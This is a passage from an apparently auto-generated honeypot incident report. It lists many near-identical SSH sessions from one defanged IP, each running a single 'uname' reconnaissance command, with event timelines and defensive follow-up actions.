| `2026-07-19 10:41:39` | `cowrie.session.params` |
| `2026-07-19 10:41:39` | `cowrie.command.input` |
| `2026-07-19 10:41:41` | `cowrie.log.closed` |
| `2026-07-19 10:41:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e08329b3dc8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:41 |
| **Last Seen** | 2026-07-19 10:41 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:41:31` | `cowrie.session.connect` |
| `2026-07-19 10:41:35` | `cowrie.client.version` |
| `2026-07-19 10:41:35` | `cowrie.client.kex` |
| `2026-07-19 10:41:45` | `cowrie.login.success` |
| `2026-07-19 10:41:51` | `cowrie.session.params` |
| `2026-07-19 10:41:51` | `cowrie.command.input` |
| `2026-07-19 10:41:54` | `cowrie.log.closed` |
| `2026-07-19 10:41:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8416628a6670

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:41 |
| **Last Seen** | 2026-07-19 10:42 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:41:48` | `cowrie.session.connect` |
| `2026-07-19 10:41:50` | `cowrie.client.version` |
| `2026-07-19 10:41:50` | `cowrie.client.kex` |
| `2026-07-19 10:41:58` | `cowrie.login.success` |
| `2026-07-19 10:42:02` | `cowrie.session.params` |
| `2026-07-19 10:42:02` | `cowrie.command.input` |
| `2026-07-19 10:42:03` | `cowrie.log.closed` |
| `2026-07-19 10:42:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eaeac7a2320a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:42 |
| **Last Seen** | 2026-07-19 10:42 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:42:02` | `cowrie.session.connect` |
| `2026-07-19 10:42:04` | `cowrie.client.version` |
| `2026-07-19 10:42:04` | `cowrie.client.kex` |
| `2026-07-19 10:42:11` | `cowrie.login.success` |
| `2026-07-19 10:42:16` | `cowrie.session.params` |
| `2026-07-19 10:42:16` | `cowrie.command.input` |
| `2026-07-19 10:42:18` | `cowrie.log.closed` |
| `2026-07-19 10:42:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f23b88d2ddea

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:42 |
| **Last Seen** | 2026-07-19 10:42 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:42:18` | `cowrie.session.connect` |
| `2026-07-19 10:42:19` | `cowrie.client.version` |
| `2026-07-19 10:42:19` | `cowrie.client.kex` |
| `2026-07-19 10:42:26` | `cowrie.login.success` |
| `2026-07-19 10:42:32` | `cowrie.session.params` |
| `2026-07-19 10:42:32` | `cowrie.command.input` |
| `2026-07-19 10:42:34` | `cowrie.log.closed` |
| `2026-07-19 10:42:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09d99cbe87f2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:42 |
| **Last Seen** | 2026-07-19 10:42 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:42:30` | `cowrie.session.connect` |
| `2026-07-19 10:42:32` | `cowrie.client.version` |
| `2026-07-19 10:42:32` | `cowrie.client.kex` |
| `2026-07-19 10:42:41` | `cowrie.login.success` |
| `2026-07-19 10:42:44` | `cowrie.session.params` |
| `2026-07-19 10:42:44` | `cowrie.command.input` |
| `2026-07-19 10:42:45` | `cowrie.log.closed` |
| `2026-07-19 10:42:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-171d1c33fbd4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:42 |
| **Last Seen** | 2026-07-19 10:42 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:42:47` | `cowrie.session.connect` |
| `2026-07-19 10:42:47` | `cowrie.client.version` |
| `2026-07-19 10:42:47` | `cowrie.client.kex` |
| `2026-07-19 10:42:54` | `cowrie.login.success` |
| `2026-07-19 10:42:58` | `cowrie.session.params` |
| `2026-07-19 10:42:58` | `cowrie.command.input` |
| `2026-07-19 10:42:59` | `cowrie.log.closed` |
| `2026-07-19 10:42:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15ff691a9b3a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:43 |
| **Last Seen** | 2026-07-19 10:43 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:43:00` | `cowrie.session.connect` |
| `2026-07-19 10:43:02` | `cowrie.client.version` |
| `2026-07-19 10:43:02` | `cowrie.client.kex` |
| `2026-07-19 10:43:19` | `cowrie.login.success` |
| `2026-07-19 10:43:25` | `cowrie.session.params` |
| `2026-07-19 10:43:25` | `cowrie.command.input` |
| `2026-07-19 10:43:26` | `cowrie.log.closed` |
| `2026-07-19 10:43:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f0633d33e08

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:43 |
| **Last Seen** | 2026-07-19 10:43 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:43:10` | `cowrie.session.connect` |
| `2026-07-19 10:43:13` | `cowrie.client.version` |
| `2026-07-19 10:43:13` | `cowrie.client.kex` |
| `2026-07-19 10:43:20` | `cowrie.login.success` |
| `2026-07-19 10:43:25` | `cowrie.session.params` |
| `2026-07-19 10:43:25` | `cowrie.command.input` |
| `2026-07-19 10:43:27` | `cowrie.log.closed` |
| `2026-07-19 10:43:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91462ce57105

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:43 |
| **Last Seen** | 2026-07-19 10:43 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:43:27` | `cowrie.session.connect` |
| `2026-07-19 10:43:28` | `cowrie.client.version` |
| `2026-07-19 10:43:28` | `cowrie.client.kex` |
| `2026-07-19 10:43:35` | `cowrie.login.success` |
| `2026-07-19 10:43:38` | `cowrie.session.params` |
| `2026-07-19 10:43:38` | `cowrie.command.input` |
| `2026-07-19 10:43:39` | `cowrie.log.closed` |
| `2026-07-19 10:43:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d705ac299924

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:43 |
| **Last Seen** | 2026-07-19 10:43 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:43:40` | `cowrie.session.connect` |
| `2026-07-19 10:43:43` | `cowrie.client.version` |
| `2026-07-19 10:43:45` | `cowrie.client.kex` |
| `2026-07-19 10:43:52` | `cowrie.login.success` |
| `2026-07-19 10:43:55` | `cowrie.session.params` |
| `2026-07-19 10:43:55` | `cowrie.command.input` |
| `2026-07-19 10:43:57` | `cowrie.log.closed` |
| `2026-07-19 10:43:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea9d9ffe74a5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:43 |
| **Last Seen** | 2026-07-19 10:44 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:43:55` | `cowrie.session.connect` |
| `2026-07-19 10:43:56` | `cowrie.client.version` |
| `2026-07-19 10:43:56` | `cowrie.client.kex` |
| `2026-07-19 10:44:04` | `cowrie.login.success` |
| `2026-07-19 10:44:08` | `cowrie.session.params` |
| `2026-07-19 10:44:08` | `cowrie.command.input` |
| `2026-07-19 10:44:11` | `cowrie.log.closed` |
| `2026-07-19 10:44:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49ad9a72f915

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:44 |
| **Last Seen** | 2026-07-19 10:44 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:44:07` | `cowrie.session.connect` |
| `2026-07-19 10:44:09` | `cowrie.client.version` |
| `2026-07-19 10:44:09` | `cowrie.client.kex` |
| `2026-07-19 10:44:18` | `cowrie.login.success` |
| `2026-07-19 10:44:25` | `cowrie.session.params` |
| `2026-07-19 10:44:25` | `cowrie.command.input` |
| `2026-07-19 10:44:27` | `cowrie.log.closed` |
| `2026-07-19 10:44:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a60ad63cd58

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:44 |
| **Last Seen** | 2026-07-19 10:44 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:44:20` | `cowrie.session.connect` |
| `2026-07-19 10:44:24` | `cowrie.client.version` |
| `2026-07-19 10:44:24` | `cowrie.client.kex` |
| `2026-07-19 10:44:31` | `cowrie.login.success` |
| `2026-07-19 10:44:37` | `cowrie.session.params` |
| `2026-07-19 10:44:37` | `cowrie.command.input` |
| `2026-07-19 10:44:40` | `cowrie.log.closed` |
| `2026-07-19 10:44:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3eb5ccd7c6e2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:44 |
| **Last Seen** | 2026-07-19 10:44 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:44:33` | `cowrie.session.connect` |
| `2026-07-19 10:44:36` | `cowrie.client.version` |
| `2026-07-19 10:44:36` | `cowrie.client.kex` |
| `2026-07-19 10:44:48` | `cowrie.login.success` |
| `2026-07-19 10:44:54` | `cowrie.session.params` |
| `2026-07-19 10:44:54` | `cowrie.command.input` |
| `2026-07-19 10:44:59` | `cowrie.log.closed` |
| `2026-07-19 10:44:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-779782893bfe

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:44 |
| **Last Seen** | 2026-07-19 10:45 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:44:43` | `cowrie.session.connect` |
| `2026-07-19 10:44:48` | `cowrie.client.version` |
| `2026-07-19 10:44:48` | `cowrie.client.kex` |
| `2026-07-19 10:45:02` | `cowrie.login.success` |
| `2026-07-19 10:45:08` | `cowrie.session.params` |
| `2026-07-19 10:45:08` | `cowrie.command.input` |
| `2026-07-19 10:45:10` | `cowrie.log.closed` |
| `2026-07-19 10:45:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-638d0fca6e25

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:44 |
| **Last Seen** | 2026-07-19 10:45 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:44:56` | `cowrie.session.connect` |
| `2026-07-19 10:45:00` | `cowrie.client.version` |
| `2026-07-19 10:45:00` | `cowrie.client.kex` |
| `2026-07-19 10:45:10` | `cowrie.login.success` |
| `2026-07-19 10:45:17` | `cowrie.session.params` |
| `2026-07-19 10:45:17` | `cowrie.command.input` |
| `2026-07-19 10:45:19` | `cowrie.log.closed` |
| `2026-07-19 10:45:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e39b6a7e715

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:45 |
| **Last Seen** | 2026-07-19 10:45 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:45:14` | `cowrie.session.connect` |
| `2026-07-19 10:45:17` | `cowrie.client.version` |
| `2026-07-19 10:45:17` | `cowrie.client.kex` |
| `2026-07-19 10:45:31` | `cowrie.login.success` |
| `2026-07-19 10:45:36` | `cowrie.session.params` |
| `2026-07-19 10:45:36` | `cowrie.command.input` |
| `2026-07-19 10:45:41` | `cowrie.log.closed` |
| `2026-07-19 10:45:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58105f6e533b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:45 |
| **Last Seen** | 2026-07-19 10:45 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:45:26` | `cowrie.session.connect` |
| `2026-07-19 10:45:29` | `cowrie.client.version` |
| `2026-07-19 10:45:29` | `cowrie.client.kex` |
| `2026-07-19 10:45:43` | `cowrie.login.success` |
| `2026-07-19 10:45:53` | `cowrie.session.params` |
| `2026-07-19 10:45:53` | `cowrie.command.input` |
| `2026-07-19 10:45:56` | `cowrie.log.closed` |
| `2026-07-19 10:45:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b2c29a2e49c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:45 |
| **Last Seen** | 2026-07-19 10:46 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:45:37` | `cowrie.session.connect` |
| `2026-07-19 10:45:41` | `cowrie.client.version` |
| `2026-07-19 10:45:41` | `cowrie.client.kex` |
| `2026-07-19 10:45:56` | `cowrie.login.success` |
| `2026-07-19 10:46:01` | `cowrie.session.params` |
| `2026-07-19 10:46:01` | `cowrie.command.input` |
| `2026-07-19 10:46:04` | `cowrie.log.closed` |
| `2026-07-19 10:46:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1709fd9fea90

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:45 |
| **Last Seen** | 2026-07-19 10:46 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:45:55` | `cowrie.session.connect` |
| `2026-07-19 10:45:57` | `cowrie.client.version` |
| `2026-07-19 10:45:57` | `cowrie.client.kex` |
| `2026-07-19 10:46:07` | `cowrie.login.success` |
| `2026-07-19 10:46:11` | `cowrie.session.params` |
| `2026-07-19 10:46:11` | `cowrie.command.input` |
| `2026-07-19 10:46:13` | `cowrie.log.closed` |
| `2026-07-19 10:46:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7f3f9a0f458

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:46 |
| **Last Seen** | 2026-07-19 10:46 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:46:09` | `cowrie.session.connect` |
| `2026-07-19 10:46:11` | `cowrie.client.version` |
| `2026-07-19 10:46:11` | `cowrie.client.kex` |
| `2026-07-19 10:46:19` | `cowrie.login.success` |
| `2026-07-19 10:46:25` | `cowrie.session.params` |
| `2026-07-19 10:46:25` | `cowrie.command.input` |
| `2026-07-19 10:46:27` | `cowrie.log.closed` |
| `2026-07-19 10:46:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63cff93ffdbf

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:46 |
| **Last Seen** | 2026-07-19 10:46 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:46:23` | `cowrie.session.connect` |
| `2026-07-19 10:46:25` | `cowrie.client.version` |
| `2026-07-19 10:46:25` | `cowrie.client.kex` |
| `2026-07-19 10:46:33` | `cowrie.login.success` |
| `2026-07-19 10:46:43` | `cowrie.session.params` |
| `2026-07-19 10:46:43` | `cowrie.command.input` |
| `2026-07-19 10:46:45` | `cowrie.log.closed` |
| `2026-07-19 10:46:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b117758605e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:46 |
| **Last Seen** | 2026-07-19 10:46 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:46:39` | `cowrie.session.connect` |
| `2026-07-19 10:46:41` | `cowrie.client.version` |
| `2026-07-19 10:46:41` | `cowrie.client.kex` |
| `2026-07-19 10:46:51` | `cowrie.login.success` |
| `2026-07-19 10:46:55` | `cowrie.session.params` |
| `2026-07-19 10:46:55` | `cowrie.command.input` |
| `2026-07-19 10:46:57` | `cowrie.log.closed` |
| `2026-07-19 10:46:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdf918e51b7d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:46 |
| **Last Seen** | 2026-07-19 10:47 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:46:53` | `cowrie.session.connect` |
| `2026-07-19 10:46:55` | `cowrie.client.version` |
| `2026-07-19 10:46:55` | `cowrie.client.kex` |
| `2026-07-19 10:47:05` | `cowrie.login.success` |
| `2026-07-19 10:47:18` | `cowrie.session.params` |
| `2026-07-19 10:47:18` | `cowrie.command.input` |
| `2026-07-19 10:47:20` | `cowrie.log.closed` |
| `2026-07-19 10:47:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2382f09ca368

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:47 |
| **Last Seen** | 2026-07-19 10:47 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:47:04` | `cowrie.session.connect` |
| `2026-07-19 10:47:06` | `cowrie.client.version` |
| `2026-07-19 10:47:06` | `cowrie.client.kex` |
| `2026-07-19 10:47:16` | `cowrie.login.success` |
| `2026-07-19 10:47:19` | `cowrie.session.params` |
| `2026-07-19 10:47:19` | `cowrie.command.input` |
| `2026-07-19 10:47:21` | `cowrie.log.closed` |
| `2026-07-19 10:47:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db1ebd24ee14

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:47 |
| **Last Seen** | 2026-07-19 10:47 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
